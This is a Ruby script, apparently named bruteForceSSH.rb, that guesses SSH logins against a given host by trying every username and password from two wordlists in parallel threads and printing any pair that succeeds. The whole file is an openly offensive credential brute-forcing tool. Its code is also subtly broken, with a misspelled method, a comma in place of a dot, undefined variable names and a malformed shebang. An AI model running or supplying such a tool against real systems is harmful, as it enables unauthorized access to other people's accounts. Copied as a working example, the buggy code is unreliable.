#!usr/bin/env ruby

require 'net/ssh'

@threads = []
@accepts = []
@users = []
@passwords = []

hosts = ARGV[0]
user_path = ARGV[1]
pass_path = ARGV[2]

def verifyArgs(hosts, user_path, pass_path)
  if !hosts || !user_path || !pass_path
    puts "[!] correct usage: rb bruteForceSSH.rb host path_to_users_file path_to_passwords_file"
    putd "[!] example: rb bruteForceSSH.rb 192.168.0.1 ./users.txt ./passwords.txt"
  end 
  begin 

    users_file = File.open(user_path)
    @users = users_file.readlines.map(&:chomp)
    users_file.close

    pass_file = File.open(pass_path)
    @passwords = pass_file.readlines.map(&:chomp)
    pass_file.close

    if @users.empty?
      puts "file with users is empty"
    end

    if @passwords.empty?
      puts "file with passwords is empty"
    end

  rescue
    puts "error open files"
  end
end

def attack_ssh(host, user, password, port = 22, timeout = 5)
  begin
    Net::SSH.start(host, user, :password => password, :auth_methods => ["password"], :port => port, :non_interactive => true, :timeout => timeout) do |session|
      puts "Password founded: #{host}| #{user}:#{password}"
      session.close unless session.nil?
      @accepts,push({'host' => host, 'user' => user, 'password' => password})
  end

  rescue Net::SSH::Disconnect
    puts "[!] The remote '#{host}' has disconnected"
  rescue Net::SSH::ConnectionTimeout
    puts "[!] The host '#{host}' not alive"
  rescue Net::SSH::Timeout 
    puts "[!] The host '#{host}' disconnected/timeouted unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "[!] Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "[!] Wrong Password: #{host} | #{user}:#{password}"
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "[!] The host '#{host}' doesn't accept password authentication method."
  rescue Errno::EHOSTUNREACH
    puts "[!] No route to host: '#{host}'"
  rescue Errno::ECONNRESET
    puts "[!] Connection reset by peer: '#{host}'"
  rescue SocketError => ex
    puts ex.inspect
  end
end

verifyArgs(hosts,users_path,passs_path)

puts "Users list size: #{@users.length()}"
puts "Passwords list size: #{@passwords.length()}"

@users.each do |user|
  @passwords.each do |password|
    sleep(0.1)
    @threads << Thread.new { attack_ssh(hosts, user, password) }
  end 
end

@threads.each { |thr| thr.join }

puts "accepts #{@accepts.length()}"
@accepts.each { |accept| puts accept }

